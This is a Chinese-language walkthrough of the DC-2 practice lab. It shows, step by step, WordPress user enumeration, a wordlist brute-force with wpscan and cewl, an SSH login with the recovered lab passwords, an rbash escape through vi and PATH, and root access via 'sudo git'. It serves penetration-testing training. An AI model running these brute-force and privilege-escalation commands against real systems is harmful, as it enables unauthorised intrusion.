# OSCP系列靶场-Esay-DC-2

## 总结

getwebshell → 发现`wordpress`的`CMS`→ 利用专用扫描器`wpscan`→ 枚举用户名 → 利用`cewl`生成个性化密码 →
`wpscan`枚举密码 → 发现2个用户以及密码 → 只能登陆其中一个

提 权 思 路 → `rbash`逃逸 → 环境变量逃逸 → 内部利用`su`登录另一个用户 → `sudo-git`提权

## 准备工作

  * 启动VPN  
获取攻击机IP > `192.168.45.208`

![](https://image.3001.net/images/20230728/1690535868_64c387bc9d811de04c2b2.png!small)

  * 启动靶机  
获取目标机器IP > `192.168.230.194`

![](https://image.3001.net/images/20230728/1690535869_64c387bd931f8647f7b8d.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.230.194
    

![](https://image.3001.net/images/20230728/1690535870_64c387be5b52f6b4077d3.png!small)

通过两次收集到的端口:`→80,7744`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p80,7744 192.168.230.194
    

![](https://image.3001.net/images/20230728/1690535871_64c387bf586ded757d48b.png!small)

## 信息收集-端口测试

发现一个是`http`，另一个是`ssh`。突破口应该在`http`

### 80-HTTP端口的信息收集

访问 http://192.168.230.194:80 发现特别慢，存在重定向，进行`host`绑定

![](https://image.3001.net/images/20230728/1690535872_64c387c0afe1c3282f4b7.png!small)

#### host绑定

发现访问IP被重定向，修改host

    
    
    vim /etc/hosts
    192.168.230.194 dc-2
    

![](https://image.3001.net/images/20230728/1690535873_64c387c1b745d905caf8a.png!small)  
重新访问该端口，发现是`wordpress`

![](https://image.3001.net/images/20230728/1690535874_64c387c2d30994a69d939.png!small)

#### 信息收集-网站指纹

    
    
    whatweb -v http://192.168.230.194:80 
    

`CMS`为`WordPress 4.7.10`

![](https://image.3001.net/images/20230728/1690535876_64c387c4929e73b695f3c.png!small)

#### 漏洞利用-网站指纹

    
    
    msfconsole
    
    searchsploit WordPress 4.7.10
    

查看了一下`wordpress`的内容都和插件有关

![](https://image.3001.net/images/20230728/1690535877_64c387c59f82b8e1b4d2b.png!small)

#### 信息收集-源码查看

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://dc-2 
    # 利用html2text转换纯文本方便查看
    curl http://dc-2  | html2text
    

没什么内容

![](https://image.3001.net/images/20230728/1690535878_64c387c6cc9116fb16c1d.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://dc-2 -x 302,403
    

查看了一下目录，基本确定是由`wpscan`组成

![](https://image.3001.net/images/20230728/1690535880_64c387c85ca701f3682da.png!small)

#### 漏洞探测-wpscan扫描

针对wordpress的专用扫描器

    
    
    # -e枚举 ap枚举插件 u枚举用户名 t枚举主题
    wpscan --url http://dc-2 --enumerate ap,u,t
    

![](https://image.3001.net/images/20230728/1690535881_64c387c9ac7e4579735e3.png!small)

![](https://image.3001.net/images/20230728/1690535883_64c387cb30906bc5f79c4.png!small)  
发现了3个用户名`admin`、`jerry`、`tom`

#### 信息收集-网站提示

乘着在扫描的空挡，点点点，发现有flag1的提示

![](https://image.3001.net/images/20230728/1690535884_64c387cc67587c77c4d98.png!small)  
提示可以用`cewl`生成密码字典  
又点了几个端点，发现登录端点，发散思维可以爆破账户密码

![](https://image.3001.net/images/20230728/1690535885_64c387cd7cf0a1fc660ba.png!small)

## 漏洞利用-getwebshell

### 暴力破解-cewl字典生成

发现站点极具个人特色，尝试生成对应的字典

    
    
    # 爬取url写入到字典
    cewl http://dc-2 > passwords.txt
    

![](https://image.3001.net/images/20230728/1690535886_64c387ce41610ee054fb4.png!small)

### wpscan枚举密码

利用wpscan枚举密码

    
    
    # 密码枚举
    wpscan --url http://dc-2 --passwords passwords.txt
    

![](https://image.3001.net/images/20230728/1690535887_64c387cf16a168af7d5eb.png!small)  
得到账号密码信息

    
    
    [SUCCESS] - jerry / adipiscing                                      
    [SUCCESS] - tom / parturient  
    

![](https://image.3001.net/images/20230728/1690535888_64c387d018286db057bd5.png!small)  
对应的账号密码是否可以用在`SSH`上呢？

### 22-SSH账号密码登录

获取账号密码之后利用SSH进行登录 发现`jerry`登录不上!`tom`登录上了

    
    
    sudo ssh tom<span class="label label-primary">@192.168.230.194</span> -p7744
    password > parturient  
    

![](https://image.3001.net/images/20230728/1690535889_64c387d1288ac94881bdb.png!small)

## 内网遨游-getshell

刚进入之后发现连`find`命令都没法用，是`rbash`

![](https://image.3001.net/images/20230728/1690535890_64c387d23c75be84aaa59.png!small)

### Linux用户交互shell受限逃逸

枚举是找到突破方法的重要组成部分。

    
    
    # 检查当前环境遍历可以用的命令
    echo $PATH
    # 查看里面的命令有哪些
    ls [$PATH]
    

![](https://image.3001.net/images/20230728/1690535890_64c387d2d8c5ba383b8d4.png!small)  
发现了4个可以用的命令  
如果发现有东西的话 访问 https://gtfobins.github.io 寻找  
发现了关于`vi`的`shell`

![](https://image.3001.net/images/20230728/1690535891_64c387d3a698aa786355b.png!small)  
方法a尝试了不行，试试方法b

    
    
    vi flag3.txt
    -----添加-----    :set shell=/bin/sh
    :shell
    

成功获得了一个`shell`

![](https://image.3001.net/images/20230728/1690535892_64c387d43fe0e4abdcfae.png!small)  
发现只获得了部分的权限，可以用`cd`了

![](https://image.3001.net/images/20230728/1690535893_64c387d50e0ded66079e6.png!small)

#### 修改环境变量逃逸

我们通过`vi`获得了一个高一些的`shell`，查看`PATH`之后可以尝试修改环境变量

    
    
    # 查看环境变量
    echo $PATH
    # 重写环境变量
    PATH=/usr/bin:/bin
    

![](https://image.3001.net/images/20230728/1690535893_64c387d5b107d60bf6f64.png!small)

### FLAG1获取

    
    
    $ find / -name local.txt 2>/dev/null
    /home/tom/local.txt
    $ cat /home/tom/local.txt
    ***********************
    

![](https://image.3001.net/images/20230728/1690535894_64c387d6655ebb6c957eb.png!small)

### 权限提升

#### Linux提权-sudo提权尝试(失败)

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现需要密码，尝试失败

![](https://image.3001.net/images/20230728/1690535895_64c387d71a78531ebde10.png!small)

#### Linux提权-suid提权尝试(失败)

    
    
    # -user 指定文件拥有者
    find / -user root -perm -4000 -print 2>/dev/null
    # -perm 文件权限
    find / -perm -u=s -type f 2>/dev/null
    # -exec 执行系统命令
    find / -user root -perm -4000 -exec ls -ldb {} ;
    

![](https://image.3001.net/images/20230728/1690535895_64c387d7d30455b6e0701.png!small)

#### Linux提权-登录另外用户

突然想起刚才看到的`flag3.txt`中提到了`su`  
在利用wpscan时我们获取了另一个用户的密码，尝试登录另一个用户尝试

    
    
    su jerry
    password > adipiscing    
    

![](https://image.3001.net/images/20230728/1690535896_64c387d8b4d6d08aad1ab.png!small)

##### Linux提权-sudo提权尝试

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现了`git`命令

![](https://image.3001.net/images/20230728/1690535897_64c387d967948df95c307.png!small)  
去查看之后选择其中的一条命令

![](https://image.3001.net/images/20230728/1690535898_64c387da3a5245838c0ed.png!small)

使用了

    
    
    # 使用了第二条发现成功
    sudo git -p help config
    # 成功提权
    !/bin/sh
    

就是回显有点问题

![](https://image.3001.net/images/20230728/1690535899_64c387db01a68f942f635.png!small)

### FLAG2获取

    
    
    cat /root/proof.txt
    # **********************
    

完结撒花~

